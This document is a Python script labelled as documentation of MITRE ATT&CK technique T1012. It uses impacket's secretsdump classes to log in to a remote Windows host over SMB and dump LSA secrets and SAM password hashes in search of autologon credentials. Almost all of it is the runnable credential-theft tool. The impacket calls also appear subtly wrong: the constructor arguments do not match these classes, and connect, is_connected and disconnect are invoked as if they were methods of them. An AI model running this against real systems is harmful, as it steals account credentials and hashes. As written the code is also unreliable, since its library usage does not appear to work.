# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T1012 - Query Registry
# Objective: Remotely query the registry to find sensitive information.
# This script checks for autologon credentials using the impacket secretsdump module.

#!/usr/bin/env python3
import sys
import logging
from impacket.examples.secretsdump import SAMHashes, LSASecrets, RemoteOperations

# Configure logging to see impacket's output
logging.basicConfig(level=logging.INFO)

def query_registry_autologon(target, username, password, domain):
    """
    Connects to a remote machine and queries the registry for autologon credentials.
    """
    try:
        print(f"[*] Attempting to connect to {target}...")

        # Use a single RemoteOperations instance to manage the connection
        # The constructor handles the SMB connection setup.
        remote_ops = RemoteOperations(target, username, password, domain)
        remote_ops.connect() # Establishes the SMB connection

        print("[+] Connection successful. Dumping secrets...")

        # 1. Dump LSA Secrets to find potential L$SecretAutologon
        # This is where the DefaultUsername and DefaultPassword are often stored.
        lsa_secrets = LSASecrets(remote_ops)
        lsa_secrets.dumpCachedSecrets()

        # 2. Dump SAM hashes (less likely to contain autologon, but good for context)
        sam_hashes = SAMHashes(remote_ops)
        sam_hashes.dump()

        print("[*] Secrets dump complete. Check the output above for 'DefaultUsername' and 'DefaultPassword'.")

    except Exception as e:
        print(f"[-] An error occurred: {e}")
    finally:
        # Ensure the connection is closed properly
        if 'remote_ops' in locals() and remote_ops.is_connected():
            print("[*] Disconnecting...")
            remote_ops.disconnect()

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("Usage: ./T1012_query_registry_fixed.py <target> <username> <password> <domain>")
        print("Example: ./T1012_query_registry_fixed.py 192.168.1.100 user pass .")
        sys.exit(1)

    # Unpack arguments
    target_ip, user, passwd, dom = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
    
    # Call the main function
    query_registry_autologon(target_ip, user, passwd, dom)